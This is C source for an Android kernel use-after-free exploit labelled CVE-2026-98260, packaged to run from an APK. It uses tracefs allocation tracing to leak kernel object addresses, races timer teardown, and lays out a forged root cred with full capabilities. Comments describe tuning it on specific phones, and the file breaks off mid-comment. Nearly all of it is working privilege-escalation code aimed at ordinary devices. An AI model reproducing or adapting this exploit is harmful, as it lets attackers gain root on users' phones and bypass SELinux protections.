/*
 * CVE-2026-98260 UAF Exploit - APK adapted version
 * 
 * Change: removed #include "offsets.h", now gets offsets from kernel_table.c
 * Original: ran standalone on PC, offsets embedded at compile time
 * Current: bundled in APK, reads profile blob from stdin at runtime
 */

#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

// get offset table from kernel_table.c
#include "kernel_table.h"
#include "rawscan.h"
#include "memguard.h"

/*
 * rootd control surface (implemented in pc98260_rootd.c).
 *
 * Needed because the two filesystem-based shutdown channels (control socket
 * command, stop file) both stop working once a successful KernelSU late-load
 * pushes SELinux back to Enforcing. The flag/lifecycle helpers let this file
 * observe rootd and forward the stop request as SIGTERM, which the kernel
 * delivers regardless of labels.
 */
void pc98260_rootd_request_stop(void);
int pc98260_rootd_stop_requested(void);
int pc98260_rootd_phase(void);
const char *pc98260_rootd_stop_path(void);

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define CPU0_TRACE TRACE "/per_cpu/cpu0/trace"
#define PAGE_OFFSET_DEFAULT UINT64_C(0xffffff7f80000000)
static uint64_t g_page_offset = PAGE_OFFSET_DEFAULT;

// runtime offset table (from kernel_table)
static uint64_t TIMER_LINK;
static uint64_t CRED_LINK;
static uint64_t SELINUX_LINK;
static uint64_t LINK_USER_NS;
static uint64_t LINK_ROOT_USER;
static uint64_t LINK_GROUPS;
static uint64_t LINK_UCOUNTS;
static uint32_t TASK_CRED;
static uint32_t TASK_STRUCT_SIZE;
static uint32_t KITIMER_NODE;
/* sizeof(struct k_itimer)：随内核版本变（6.6=0x108/264，6.18=0x180/384）。
 * trace 里 kmem_cache_alloc 的 req 字段就是这个大小，写死会让过滤全落空。 */
static uint64_t KITIMER_SIZE;
/* sizeof(struct cred)：184（6.6/6.12/6.18）/ 176（5.15/6.1）。 */
static uint64_t CRED_SIZE;
/* 运行期实测的分配调用点（已含 slide）。由 calib_a 从 trace 解析后落盘，
 * 有了它们就不必依赖写死的内核内锚点（6.18 开 LTO 后锚点已漂移）。 */
static uint64_t SITE_KITIMER_RT, SITE_CRED_RT, SITE_TASK_RT;
/* 写死锚点（do_timer_create+0xa8 / prepare_creds+0x24）只在 6.6 系可信：
 * 它们的标定值对应的正是 6.6 的 sizeof(struct k_itimer)=0x108。 */
#define STATIC_ANCHOR_TRUSTED (KITIMER_SIZE == 0x108ULL)
/* call-site of the task_struct slab allocation inside copy_process (0 = unknown) */
static uint64_t TASK_ALLOC_LINK;
/* task_struct slab 的 object_size（运行期实测，calib_a 落盘）。
 * profile 里 BTF 推导的 sizeof(struct task_struct) 偏小：CONFIG_THREAD_SIZE_IN_TSK
 * 把栈内嵌进 task_struct，真机 6.18 实测 4736(BTF) + 1024(THREAD_SIZE) = 5760。
 * 所以尺寸窗口以运行期实测值为准，profile 值只当兜底。 */
static uint64_t TASK_SIZE_RT;
/*
 * Forged-cred layout (B4): all offsets come from the profile (blob v4) so the
 * empty cred page matches whatever KMI the device runs. android15-8 values:
 *   size=184 uid@8 caps 48/56/64/72/80 security@128 user@136 ns@144 uc@152 grp@160
 * android13-8/android14-11 (5.15/6.1) are 8 bytes tighter: size=176 uid@4,
 * caps 40/48/56/64/72, security@120, user@128, ns@136, uc@144, grp@152.
 */
static uint32_t CRED_PLANT_SIZE;
static uint32_t CRED_UID_OFF;
static uint32_t CRED_OFF_CAP_INH, CRED_OFF_CAP_PERM, CRED_OFF_CAP_EFF;
static uint32_t CRED_OFF_CAP_BSET, CRED_OFF_CAP_AMB;
static uint32_t CRED_OFF_SELINUX, CRED_OFF_ROOT_USER;
static uint32_t CRED_OFF_USER_NS, CRED_OFF_UCOUNTS, CRED_OFF_GROUPS;

static uint64_t g_slide = UINT64_C(0);
#define FULLCAP UINT64_C(0x1ffffffffff)

/* $CVE98260_HOME 下读一个 "0x..." 结果文件（calib_a 落盘的运行期调用点）。 */
static uint64_t read_site_file(const char *name)
{
	char path[512];
	char buf[64];
	unsigned long long v = 0;
	FILE *f;
	const char *home = getenv("CVE98260_HOME");

	if (!home || !*home)
		home = "/data/local/tmp/cve98260-app";
	snprintf(path, sizeof(path), "%s/%s", home, name);
	f = fopen(path, "r");
	if (!f)
		return 0;
	if (fgets(buf, sizeof(buf), f))
		sscanf(buf, "0x%llx", &v);
	fclose(f);
	return (uint64_t)v;
}

// initialize offset table (from kernel_table)
static int init_offsets(void) {
    const struct kernel_offsets *offsets = kernel_table_get();
    if (!offsets) {
        fprintf(stderr, "[config] error: kernel offset table not loaded\n");
        return -1;
    }
    
    TIMER_LINK = offsets->timer_link;
    CRED_LINK = offsets->cred_link;
    SELINUX_LINK = offsets->selinux_link;
    LINK_USER_NS = offsets->user_ns;
    LINK_ROOT_USER = offsets->root_user;
    LINK_GROUPS = offsets->groups;
    LINK_UCOUNTS = offsets->ucounts;
    TASK_CRED = offsets->task_cred;
    TASK_STRUCT_SIZE = offsets->task_struct_size;
    KITIMER_NODE = offsets->kitimer_node;
    TASK_ALLOC_LINK = offsets->task_alloc_link;
    g_page_offset = offsets->page_offset;
    KITIMER_SIZE = offsets->kitimer_size ? offsets->kitimer_size : 0x108ULL;
    CRED_SIZE = offsets->cred_size ? offsets->cred_size : 184ULL;

    /* 运行期实测的调用点（calib_a 产出）。有则优先于写死锚点。 */
    SITE_KITIMER_RT = read_site_file("sites.kitimer");
    SITE_CRED_RT = read_site_file("sites.cred");
    SITE_TASK_RT = read_site_file("sites.task");
    /* task_struct 的 slab object_size 实测值（没有就退回 profile 的 BTF 值） */
    TASK_SIZE_RT = read_site_file("task_size.txt");
    if (SITE_KITIMER_RT || SITE_CRED_RT || SITE_TASK_RT)
        dprintf(STDOUT_FILENO,
                "[config] runtime call sites: kitimer=%#" PRIx64 " cred=%#" PRIx64
                " task=%#" PRIx64 "\n",
                SITE_KITIMER_RT, SITE_CRED_RT, SITE_TASK_RT);
    if (TASK_SIZE_RT)
        dprintf(STDOUT_FILENO, "[config] task_struct object_size=%#" PRIx64
                " (profile=%u)\n", TASK_SIZE_RT, TASK_STRUCT_SIZE);

    /* forged-cred layout（profile blob v4；老 profile 已由 kernel_table.c 补 6.6 默认值） */
    CRED_PLANT_SIZE = offsets->cred_size;
    CRED_UID_OFF = offsets->cred_uid;
    CRED_OFF_CAP_INH = offsets->cred_cap_inh;
    CRED_OFF_CAP_PERM = offsets->cred_cap_perm;
    CRED_OFF_CAP_EFF = offsets->cred_cap_eff;
    CRED_OFF_CAP_BSET = offsets->cred_cap_bset;
    CRED_OFF_CAP_AMB = offsets->cred_cap_amb;
    CRED_OFF_SELINUX = offsets->cred_off_security;
    CRED_OFF_ROOT_USER = offsets->cred_off_user;
    CRED_OFF_USER_NS = offsets->cred_off_user_ns;
    CRED_OFF_UCOUNTS = offsets->cred_off_ucounts;
    CRED_OFF_GROUPS = offsets->cred_off_groups;

    return 0;
}

static void print_cfg(void)
{
	dprintf(STDOUT_FILENO, "[config] PAGE=%#" PRIx64 " TIMER=%#" PRIx64 " CRED=%#" PRIx64 " SELINUX=%#" PRIx64 "\n",
		g_page_offset, TIMER_LINK, CRED_LINK, SELINUX_LINK);
}

static uint64_t slide_addr(uint64_t link)
{
	return link + g_slide;
}
/* KITIMER_NODE is a runtime offset (see init_offsets); compile-time macro no longer used */
#define NFILL 42
#define NFLUSH 2048
#define MAX_RINGS 9000
#define MAX_PIPES 400
#define NVMA 50000
#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif

static _Atomic int g_go;
static _Atomic int g_stop;
static _Atomic int g_lockers;
static _Atomic int g_in_mprotect;
static _Atomic int g_exec_tid;
static _Atomic int g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc {
	atomic_int phase;
	int helpers[4];
	int nhelpers;
};
static struct ipc *ipc;

static uint64_t g_all[2200];
static int g_all_n;
static uint64_t *g_ctx;
static int g_nrings;

static void on_alarm(int sig)
{
	(void)sig;
}

static int write_file_mode(const char *path, const char *text, int extra)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int write_file(const char *path, const char *text)
{
	return write_file_mode(path, text, 0);
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

/*
 * Force the stage log down to the block device.
 *
 * A kernel panic (or a hard power loss) does not flush page cache: on 22:58 the
 * log ended mid-run and every byte after the last checkpoint came back as NUL,
 * which cost us the one piece of evidence that matters - which stage was
 * running when the device went down. fdatasync() on the inherited stdout makes
 * the probe durable. It is only called at stage boundaries, never inside the
 * reclaim/timer race windows, so it cannot perturb their timing.
 */
static void log_sync(void)
{
	(void)fdatasync(STDOUT_FILENO);
}

/*
 * 把任务的 RSS 计数推过 TASK_RSS_EVENTS_THRESH，触发 kmem/rss_stat 事件。
 *
 * ⚠️ 原来这里只 touch **一个** 4 KiB 页（RSS +1）。rss_stat 是**边沿触发**，
 * 事件的 enable 状态只有在 rss_stat 真正触发时才会被翻转 —— 而
 * kmem_cache_alloc 的 enable 是靠 trigger 间接开的（uid 2000 直接写
 * events 下的 enable 文件在真机上被拒：日志里 `armed=trigger enable=?`，
 * 写失败、读也读不回来）。
 * 于是单页 bump 很可能**够不着阈值** → 事件从未 enable → 环形缓冲里一条记录
 * 都没有 → `[uaf] captured=0 chosen=0 raw=0`。
 *
 * 这就是「有时能采到、有时采不到」的间歇性来源：RSS 计数离阈值远近不同，
 * 结果随机。leak_task() 这种「arm 完立刻 fork、马上读」的最短路径最容易中招
 * （calib_a 里 timer probe 会持续 bump RSS，阈值迟早被跨过，所以 calib 反而没事）。
 *
 * → 一次 bump 256 页（1 MiB）并重复若干轮，把计数稳稳推过阈值；
 *   munmap 会把 RSS 减回去，但事件是边沿触发，enable 状态一旦翻过来就保持。
 */
#define RSS_BUMP_PAGES  256
#define RSS_BUMP_ROUNDS 4

static int kick_rss(void)
{
	size_t sz = (size_t)RSS_BUMP_PAGES * 4096;
	unsigned char *pages;
	int rc = 0;

	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		return -1;
	pages = mmap(NULL, sz, PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pages == MAP_FAILED) {
		rc = -1;
	} else {
		for (int r = 0; r < RSS_BUMP_ROUNDS; r++)
			for (size_t i = 0; i < sz; i += 4096)
				pages[i] = (unsigned char)(i + (size_t)r);
		munmap(pages, sz);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return rc;
}

/*
 * Deterministic arm / disarm of kmem:kmem_cache_alloc.
 *
 * The reference implementation arms the event *indirectly*: it attaches
 * "enable_event:kmem:kmem_cache_alloc" to the kmem/rss_stat trigger, then kicks
 * rss_stat by touching a single anonymous page (kick_rss above). Whether that
 * actually arms the event depends on the per-task RSS counter crossing
 * TASK_RSS_EVENTS_THRESH -- one 4KiB touch only advances that counter by 1, so
 * on kernels/ROMs whose counter happens to sit far below the threshold the
 * trigger never fires and kmem_cache_alloc stays disabled for good.
 *
 * That is harmless for calib_a (the timer probe keeps bumping RSS thousands of
 * times afterwards, so the trigger fires sooner or later) but fatal for the
 * short-lived captures: leak_task()/leak_cred() arm, fork once, and read the
 * buffer immediately -- no further RSS growth, so if the trigger missed there
 * are zero kmem_cache_alloc records in the buffer. Observed reproducibly on
 * Xiaomi 2510DRK44C / M332BF, kernel 6.6.118-android15-8-g0908354dac1b:
 *     [task] hits=0 foreign=0 task=0
 *     [task] leak failed
 * (foreign==0 is the tell-tale: not "wrong pid", literally no record matched
 * the size filter, because no record was emitted at all.)
 *
 * Fix: enable the event directly. The trigger path is kept as a fallback for
 * ROMs that refuse the direct write.
 */
/*
 * Read events/kmem/kmem_cache_alloc/enable back and log it. A successful write()
 * to a tracefs event file is not proof that the event is live (it can stay
 * soft-disabled), and the only evidence we otherwise get is "hits=0", which is
 * indistinguishable from "no record of that size". Printing the mode plus the
 * read-back value makes the next failing log self-explanatory.
 */
static void report_arm(const char *mode)
{
	static const char path[] = TRACE "/events/kmem/kmem_cache_alloc/enable";
	char v[8] = "?";
	int fd = open(path, O_RDONLY | O_CLOEXEC);

	if (fd >= 0) {
		if (read(fd, v, sizeof(v) - 1) <= 0)
			v[0] = '?';
		close(fd);
	}
	v[strcspn(v, "\r\n")] = '\0';
	dprintf(STDOUT_FILENO, "[trace] kmem_cache_alloc armed=%s enable=%s\n",
		mode, v);
	/*
	 * 立刻落盘。设备若在这一步之后 panic（别的机型套错偏移就可能这样），
	 * 日志文件里必须已经有这一行 —— 否则崩溃前的最后一步会随 page cache
	 * 一起丢掉，我们只能拿到一个「没有日志」。
	 */
	log_sync();
}

static int arm_kmem_cache_alloc(void)
{
	if (!write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "1\n")) {
		report_arm("direct");
		return 0;
	}
	if (!trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") && !kick_rss()) {
		report_arm("trigger");
		return 0;
	}
	dprintf(STDOUT_FILENO,
		"[trace] kmem_cache_alloc arm failed errno=%d (direct+trigger)\n",
		errno);
	return -1;
}

static void disarm_kmem_cache_alloc(void)
{
	write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "0\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
}

static void disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static void quiet_reclaim_trace(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static int trace_off_on(void)
{
	if (write_file(TRACE "/tracing_on", "0\n") ||
	    write_file_mode(TRACE "/trace", "", O_TRUNC))
		return -1;
	return write_file(TRACE "/tracing_on", "1\n");
}

static uint64_t object_pfn(uint64_t ptr)
{
	return ((ptr & ~UINT64_C(0xfff)) - g_page_offset) >> 12;
}

/*
 * 注入阶段的总时间预算（秒）与截止时刻。
 *
 * 见 uaf_plant_main 里两轮重试循环的注释：没有预算的话，最坏能跑 30 多分钟，
 * 宿主那边早就超时判失败了，用户只会看到「卡死」。
 */
#define EXPLOIT_BUDGET_SEC 240
static time_t g_deadline;

/** 预算是否已经用完（未设置截止时刻时不算用完）。 */
static int budget_exhausted(void)
{
	return g_deadline != 0 && time(NULL) >= g_deadline;
}

static int cpu_count(void);

static int pfn_in_line(const char *line, uint64_t pfn)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	uint64_t got;
	if (!p)
		return 0;
	got = strtoull(p + 6, &end, 16);
	if (end == p + 6)
		return 0;
	return got == pfn;
}

static int trace_seen(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			if (strstr(line, kind) && pfn_in_line(line, pfn)) {
				fclose(file);
				return 1;
			}
		}
		fclose(file);
	}
	return 0;
}

static int cpu_count(void)
{
	char buf[128];
	char *p;
	int fd, n = 0;
	ssize_t got;
	memset(buf, 0, sizeof(buf));
	fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 8;
	got = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (got <= 0)
		return 8;
	for (p = buf; *p; ) {
		int v = 0;
		if (*p < '0' || *p > '9') {
			p++;
			continue;
		}
		while (*p >= '0' && *p <= '9')
			v = v * 10 + (*p++ - '0');
		if (v + 1 > n)
			n = v + 1;
	}
	if (n < 1)
		return 8;
	return n > 16 ? 16 : n;
}

/* ---------------- trace 环形缓冲的内存预算 + 兜底还原 ----------------
 *
 * buffer_size_kb 是**内核全局设置**：进程退出、被杀、崩溃都不会还原。
 * 旧代码把喷洒阶段的 per-CPU 环形缓冲写死 64 MiB（8 核 = 512 MiB 内核内存），
 * 而且：
 *   · 全程不看设备有多少内存（全仓没有任何 /proc/meminfo 读取）；
 *   · 还原只发生在 disarm() / quiet_reclaim_trace() 两个地方，
 *     而失败路径大多直接 return -1 走掉了 —— 缓冲停在高位；
 *   · 没有 atexit、没有信号处理，进程被杀 = 永久泄漏。
 *
 * 一轮失败就可能把 128 MiB（16 MiB/CPU × 8）永久钉在内核里，反复重试 →
 * 设备可用内存越来越低 → 卡死 → watchdog 重启。这与「同内核、别人跑就卡死
 * 重启、反复重试反复卡」的现象一致，而且和机型/内存大小强相关。
 *
 * 这里做三件事：
 *   1) 按 /proc/meminfo 的 MemTotal 给每 CPU 环形缓冲算预算（memguard.c，
 *      纯计算，有宿主单测）；
 *   2) 所有失败路径都还原；
 *   3) 进程退出（atexit）与可捕获信号都还原。
 */

/* 设备总内存（KB）。0 = 读不到（未知）。 */
static uint64_t g_mem_total_kb;

static uint64_t read_mem_total_kb(void)
{
	char buf[4096];
	ssize_t n;
	int fd = open("/proc/meminfo", O_RDONLY | O_CLOEXEC);
	uint64_t kb;

	if (fd < 0)
		return 0;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return 0;
	buf[n] = '\0';
	kb = memguard_parse_memtotal_kb(buf);
	return kb;
}

/* 按设备内存算出这个阶段每 CPU 该用多少 KB 的环形缓冲。 */
static unsigned trace_buf_kb(unsigned want)
{
	int ncpu = cpu_count();
	unsigned kb = memguard_trace_buf_kb(g_mem_total_kb, ncpu, want);

	if (kb != want)
		dprintf(STDOUT_FILENO,
			"[mem] trace buffer %u KB/cpu (want %u, memtotal %llu KB, cpus %d)\n",
			kb, want, (unsigned long long)g_mem_total_kb, ncpu);
	return kb;
}

static int write_trace_buf_kb(unsigned kb)
{
	char v[16];
	int n = snprintf(v, sizeof(v), "%u\n", kb);

	if (n <= 0 || (size_t)n >= sizeof(v))
		return -1;
	return write_file(TRACE "/buffer_size_kb", v);
}

/*
 * 把 trace 状态还原成「没动过」的样子：关 tracing、关事件、把环形缓冲缩回 7 KB。
 * 幂等：重复调用无害。
 */
static void restore_trace_state(void)
{
	disarm();
}

/*
 * 信号路径只做 async-signal-safe 的最小还原：关 tracing、把环形缓冲缩回 7 KB。
 * 不能调 disarm()——它要写事件文件、还要 mmap，不是 async-signal-safe。
 * 还原完恢复默认处置并重新发信号，让退出码语义不变。
 */
static void on_fatal_signal(int sig)
{
	int fd = open(TRACE "/tracing_on", O_WRONLY | O_CLOEXEC);

	if (fd >= 0) {
		(void)!write(fd, "0\n", 2);
		close(fd);
	}
	fd = open(TRACE "/buffer_size_kb", O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		(void)!write(fd, "7\n", 2);
		close(fd);
	}
	signal(sig, SIG_DFL);
	raise(sig);
}

static int g_socks[256][2];
static int g_nsocks;

/* ---------------- E1：资源压力的显式上下限与失败分类 ----------------
 *
 * 原实现把「灌 4GB 进 socketpair」「开 70000 个 io_setup」硬编码在循环条件里：
 *   * 低内存机型在灌入途中会被 LMK 直接杀掉，日志只剩半截，无法复盘；
 *   * 「配额被打满」与「真的出错」都表现为循环 break：ENOSPC/EMFILE 属于前者
 *     （正常终止），ENOMEM/EIO 属于后者（异常），原来一律静默。
 * 现在：上下限常量化 + 环境变量可覆盖（便于真机调参）+ 停止原因打点。
 * 默认值与历史行为完全一致，不改变利用时序。
 */
#define DRAIN_SOCKS_PAIRS_MAX  256
#define DRAIN_SOCKS_PAIR_BYTES (16U << 20)
#define DRAIN_SOCKS_TOTAL_DEF  (4UL << 30)
#define DRAIN_SOCKS_TOTAL_MIN  (64UL << 20)
#define DRAIN_SOCKS_TOTAL_MAX  (8UL << 30)

static void close_socks(void)
{
	for (int i = 0; i < g_nsocks; i++) {
		close(g_socks[i][0]);
		close(g_socks[i][1]);
	}
	g_nsocks = 0;
}

static int pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

/*
 * 关键线程绑核。
 *
 * 为什么不绑 CPU 0：CPU 0 是 Android 主线程（UI/Compose）的地盘。注入期间用户
 * 点一下弹窗，主线程就在 CPU 0 上烧一阵子；而利用原语对时序极其敏感 ——
 * locker 线程的 mprotect 循环、killer 的 SIGKILL、exec 线程的 execve、父进程的
 * trace 采集与阶段交接，四者的相对时序决定内核 timer 拆解走哪条路。被抢一下，
 * 就可能从「良性 UAF」变成「内核 panic」。
 * 真机症状：注入弹窗上点一下，有一定概率卡死并把设备带崩。
 *
 * 父进程与 exec 线程**必须绑同一个核**：两者靠共享的 ipc->phase 互相交接，
 * 同核才能保持原有的先后关系（交接是 ping-pong，不是并行）。exec 线程与
 * locker/killer 线程仍然分属两个核（原来就是 CPU 0 与 CPU 1），相对关系不变。
 *
 * 核心数少的机器（<= 2）没有富余核，只能退回原来的绑法。
 */
#define CRITICAL_CPU 2
#define RACE_CPU 1

/* 取一个可用的 CPU 编号：优先 preferred，核心不够时退回最后一个核。 */
static int pick_cpu(int preferred, int ncpu)
{
	if (ncpu > preferred)
		return preferred;
	return ncpu > 1 ? ncpu - 1 : 0;
}

/* 关键核：父进程与 exec 线程共用。 */
static int critical_cpu(void)
{
	return pick_cpu(CRITICAL_CPU, cpu_count());
}

/* 竞态核：race 子进程及其 locker/killer helper 用；与关键核不撞。 */
static int race_cpu(void)
{
	int n = cpu_count();
	int c = pick_cpu(RACE_CPU, n);
	int k = critical_cpu();
	if (c == k && n > 1)
		c = (k == 0) ? 1 : 0;
	return c;
}

/*
 * E3：raw trace 缓冲区跨函数复用。
 *
 * collect_nth / collect_site / leak_task 在同一轮里先后读取 per-CPU raw trace，
 * 原先各自 malloc(4~8MB) 再 free，反复申请/归还大块内存：既扩大了 malloc 失败面
 * （见 E2），也在内存压力（E1 刚灌完 socketpair）时产生额外抖动。
 * 统一用一块按需增长的全局缓冲，首次按需 realloc，之后复用。
 *
 * 约束：调用方不得跨调用持有返回指针，且不得重入。当前调用链全部在 main 线程
 * 串行执行（leak_task → collect_nth → collect_site），彼此不嵌套，满足该约束。
 */
static uint8_t *g_rawbuf;static size_t g_rawcap;

static uint8_t *raw_buf(size_t need)
{
	uint8_t *p;
	if (g_rawcap >= need)
		return g_rawbuf;
	p = realloc(g_rawbuf, need);
	if (!p) {
		dprintf(STDOUT_FILENO, "[raw] grow to %zu failed (cap=%zu)\n", need, g_rawcap);
		return NULL;
	}
	g_rawbuf = p;
	g_rawcap = need;
	return g_rawbuf;
}

/*
 * ------------------------------------------------------------------
 * raw trace 采集（增量扫描 k_itimer 记录）
 *
 * ⚠️ trace_pipe_raw **不支持 poll()** —— 它的等待队列只在阻塞 read() 的
 * 路径里注册，poll() 永远等不到可读信号。v1.1.9 用 poll() 决定何时
 * read()，结果真机 2026-10-31 18:24 那轮每个 cycle 都是
 *   [uaf] captured=0 chosen=0 raw=0
 * 一个字节都读不到，整条 exploit 挂掉。
 * （calib.c 的 capture_raw 之所以要 fork 子进程做阻塞读、再用普通管道
 *   转发给父进程 poll，正是因为这个限制。）
 * 所以这里老老实实用**阻塞读 + 超时打断**：read() 返回 EINTR 就说明
 * 环形缓冲排空了。
 *
 * 超时从「alarm(2)」改成 setitimer 的毫秒级：
 *   - 首次读给 2000ms 宽限（老实现 alarm(2) 就是这个量级，行为一致）；
 *   - 之后的每次读只等 400ms —— 采集前 tracing_on 已关，缓冲里的数据
 *     是冻结的，400ms 内没有新数据就等于排空了。老实现每次都要白等满
 *     2 秒，真机日志里每个 uaf cycle 的 ~2.9 秒有 ~2.0 秒耗在这。
 *
 * 多 CPU：造 timer 的子进程**不绑核**，它的分配记录可能落在任意 CPU
 * 上；只读 cpu0 时有时一条都捞不到（[uaf] too few timers）。所以 cpu0
 * 不够时再去补其它 CPU —— 这条分支只在 cpu0 不足时才会走（老实现在这里
 * 直接失败），只会把「失败」变成「成功」，不改变原来跑通的路径。
 * ------------------------------------------------------------------
 */
#define UAF_RAW_IDLE_MS 400
#define UAF_RAW_FIRST_MS 2000
#define UAF_RAW_FALLBACK_MS 1000
#define UAF_RAW_MAXCPU 16
#define UAF_RAW_CHUNK 16384

/* 读缓冲；扫描工作区在 rawscan_state 内部，两者必须分开（否则是自拷贝）。 */
static uint8_t g_raw_read_buf[UAF_RAW_CHUNK];

static uint64_t now_ms_uaf(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (uint64_t)ts.tv_sec * 1000u + (uint64_t)(ts.tv_nsec / 1000000);
}

/* setitimer 毫秒级超时；handler 是空函数（on_alarm），只为了打断阻塞读。 */
static void arm_raw_timer(unsigned ms)
{
	struct itimerval it;
	memset(&it, 0, sizeof(it));
	it.it_value.tv_sec = (time_t)(ms / 1000);
	it.it_value.tv_usec = (suseconds_t)((ms % 1000) * 1000);
	setitimer(ITIMER_REAL, &it, NULL);
}

static void disarm_raw_timer(void)
{
	struct itimerval it;
	memset(&it, 0, sizeof(it));
	setitimer(ITIMER_REAL, &it, NULL);
}

/*
 * 读某个 CPU 的 raw pipe 直到超时（缓冲排空）。
 * deadline 是这次采集的总预算上限，first_ms 是首次读的宽限。
 */
static int drain_cpu_raw(int cpu, struct rawscan_state *s,
			 uint64_t deadline, unsigned first_ms)
{
	char path[96];
	int fd, first = 1, got_any = 0;
	ssize_t got;

	snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	for (;;) {
		uint64_t now = now_ms_uaf();
		unsigned budget;
		if (now >= deadline)
			break;
		budget = first ? first_ms : UAF_RAW_IDLE_MS;
		if (deadline - now < (uint64_t)budget)
			budget = (unsigned)(deadline - now);
		if (budget < 10)
			budget = 10;
		arm_raw_timer(budget);
		got = read(fd, g_raw_read_buf, UAF_RAW_CHUNK);
		disarm_raw_timer();
		if (got <= 0)
			break;		/* EINTR（超时）= 排空了 */
		first = 0;
		got_any = 1;
		rawscan_feed(s, g_raw_read_buf, (size_t)got);
	}
	close(fd);
	return got_any ? 0 : -1;
}

static int collect_nth(int index, int *count, uint64_t *chosen)
{
	static struct rawscan_state s;
	int ncpu, cpu;
	/* 匹配键：运行期实测调用点 > 写死锚点（仅 6.6 可信） > 只按 req 匹配 */
	uint64_t site = SITE_KITIMER_RT ? SITE_KITIMER_RT : slide_addr(TIMER_LINK);
	int filter_by_site = (SITE_KITIMER_RT != 0) || STATIC_ANCHOR_TRUSTED;
	uint64_t deadline;

	rawscan_init(&s, (const uint8_t *)&site, filter_by_site, KITIMER_SIZE,
		     g_all, (int)(sizeof(g_all) / sizeof(g_all[0])), index);
	*chosen = 0;

	/* --- 阶段 A：cpu0 优先（候选顺序与旧实现一致）--- */
	deadline = now_ms_uaf() + UAF_RAW_FIRST_MS;
	drain_cpu_raw(0, &s, deadline, UAF_RAW_FIRST_MS);

	/* --- 阶段 B：cpu0 不够时才补其它 CPU（子进程不绑核，记录可能不在 cpu0）--- */
	if (s.out_n <= index) {
		ncpu = cpu_count();
		if (ncpu > UAF_RAW_MAXCPU)
			ncpu = UAF_RAW_MAXCPU;
		deadline = now_ms_uaf() + UAF_RAW_FALLBACK_MS;
		for (cpu = 1; cpu < ncpu; cpu++)
			drain_cpu_raw(cpu, &s, deadline, UAF_RAW_IDLE_MS);
	}

	*count = s.out_n;
	/*
	 * g_all[] 只有 out_cap 个槽位，旧实现却把**命中总数**直接写进 g_all_n，
	 * 而 build_watch() 按 g_all_n 去索引 g_all[] —— 命中数超过容量时就是越界读，
	 * 读到的是随机 watch 项，「哪一页被复用」的判定会失真。这里夹到容量内。
	 */
	g_all_n = s.out_n < s.out_cap ? s.out_n : s.out_cap;
	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
		s.out_n, s.chosen, s.bytes);
	/*
